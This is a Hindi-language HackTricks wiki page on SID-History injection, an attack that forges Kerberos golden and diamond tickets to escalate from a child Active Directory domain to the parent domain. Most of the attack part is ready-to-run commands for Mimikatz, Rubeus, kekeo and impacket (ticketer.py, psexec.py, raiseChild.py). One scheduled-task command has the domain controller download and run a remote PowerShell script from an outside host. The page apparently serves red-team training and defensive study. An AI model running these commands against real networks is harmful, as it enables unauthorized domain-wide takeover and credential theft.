# SID-History Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## SID History Injection Attack

**SID History Injection Attack** का ध्यान **डोमेन के बीच उपयोगकर्ता माइग्रेशन** में मदद करना है, जबकि पूर्व डोमेन से संसाधनों तक निरंतर पहुंच सुनिश्चित करना है। यह **उपयोगकर्ता के पिछले सुरक्षा पहचानकर्ता (SID) को उनके नए खाते के SID इतिहास में शामिल करके** किया जाता है। विशेष रूप से, इस प्रक्रिया का दुरुपयोग करके उच्च-विशेषाधिकार समूह (जैसे एंटरप्राइज एडमिन या डोमेन एडमिन) के SID को माता-पिता डोमेन से SID इतिहास में जोड़कर अनधिकृत पहुंच प्रदान की जा सकती है। इस शोषण से माता-पिता डोमेन के भीतर सभी संसाधनों तक पहुंच मिलती है।

इस हमले को निष्पादित करने के लिए दो तरीके हैं: या तो **गोल्डन टिकट** के निर्माण के माध्यम से या **डायमंड टिकट** के माध्यम से।

**"Enterprise Admins"** समूह के लिए SID को पहचानने के लिए, सबसे पहले रूट डोमेन का SID ढूंढना होगा। पहचान के बाद, एंटरप्राइज एडमिन समूह SID को रूट डोमेन के SID में `-519` जोड़कर बनाया जा सकता है। उदाहरण के लिए, यदि रूट डोमेन SID `S-1-5-21-280534878-1496970234-700767426` है, तो "Enterprise Admins" समूह के लिए परिणामस्वरूप SID `S-1-5-21-280534878-1496970234-700767426-519` होगा।

आप **Domain Admins** समूहों का भी उपयोग कर सकते हैं, जो **512** पर समाप्त होता है।

दूसरे डोमेन (उदाहरण के लिए "Domain Admins") के समूह का SID खोजने का एक और तरीका है:
```powershell
Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
```
### गोल्डन टिकट (Mimikatz) KRBTGT-AES256 के साथ

{% code overflow="wrap" %}
```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

/user is the username to impersonate (could be anything)
/domain is the current domain.
/sid is the current domain SID.
/sids is the SID of the target group to add ourselves to.
/aes256 is the AES256 key of the current domain's krbtgt account.
--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option
/startoffset sets the start time of the ticket to 10 mins before the current time.
/endin sets the expiry date for the ticket to 60 mins.
/renewmax sets how long the ticket can be valid for if renewed.

# The previous command will generate a file called ticket.kirbi
# Just loading you can perform a dcsync attack agains the domain
```
{% endcode %}

गोल्डन टिकट के बारे में अधिक जानकारी के लिए देखें:

{% content-ref url="golden-ticket.md" %}
[golden-ticket.md](golden-ticket.md)
{% endcontent-ref %}

### डायमंड टिकट (Rubeus + KRBTGT-AES256)

{% code overflow="wrap" %}
```powershell
# Use the /sids param
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap

# Or a ptt with a golden ticket
Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt

# You can use "Administrator" as username or any other string
```
{% endcode %}

डायमंड टिकट के बारे में अधिक जानकारी के लिए देखें:

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

{% code overflow="wrap" %}
```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
```
{% endcode %}

समझौता किए गए डोमेन के KRBTGT हैश का उपयोग करके रूट या एंटरप्राइज एडमिन के DA में वृद्धि करें:

{% code overflow="wrap" %}
```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```
{% endcode %}

हमले से प्राप्त अनुमतियों के साथ, आप नए डोमेन में उदाहरण के लिए DCSync हमला कर सकते हैं:

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

### लिनक्स से

#### [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) के साथ मैनुअल

{% code overflow="wrap" %}
```bash
# This is for an attack from child to root domain
# Get child domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
# Get root domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"

# Generate golden ticket
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator

# NOTE THAT THE USERNAME ADMINISTRATOR COULD BE ACTUALLY ANYTHING
# JUST USE THE SAME USERNAME IN THE NEXT STEPS

# Load ticket
export KRB5CCNAME=hacker.ccache

# psexec in domain controller of root
psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
```
{% endcode %}

#### Automatic using [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)

यह एक Impacket स्क्रिप्ट है जो **चाइल्ड से पैरेंट डोमेन में बढ़ने की प्रक्रिया को स्वचालित करेगी**। स्क्रिप्ट को आवश्यकता है:

* लक्षित डोमेन कंट्रोलर
* चाइल्ड डोमेन में एक एडमिन यूजर के लिए क्रेडेंशियल्स

प्रक्रिया इस प्रकार है:

* पैरेंट डोमेन के एंटरप्राइज एडमिन्स ग्रुप के लिए SID प्राप्त करता है
* चाइल्ड डोमेन में KRBTGT खाते के लिए हैश प्राप्त करता है
* एक गोल्डन टिकट बनाता है
* पैरेंट डोमेन में लॉग इन करता है
* पैरेंट डोमेन में एडमिनिस्ट्रेटर खाते के लिए क्रेडेंशियल्स प्राप्त करता है
* यदि `target-exec` स्विच निर्दिष्ट किया गया है, तो यह Psexec के माध्यम से पैरेंट डोमेन के डोमेन कंट्रोलर के लिए प्रमाणीकरण करता है।
```bash
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
```
## संदर्भ
* [https://adsecurity.org/?p=1772](https://adsecurity.org/?p=1772)
* [https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)

{% hint style="success" %}
सीखें और AWS हैकिंग का अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
सीखें और GCP हैकिंग का अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks का समर्थन करें</summary>

* [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) देखें!
* **हमारे** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**telegram समूह**](https://t.me/peass) में शामिल हों या **Twitter** 🐦 पर हमें **फॉलो** करें [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **हैकिंग ट्रिक्स साझा करें और** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में PR सबमिट करें।

</details>
{% endhint %}
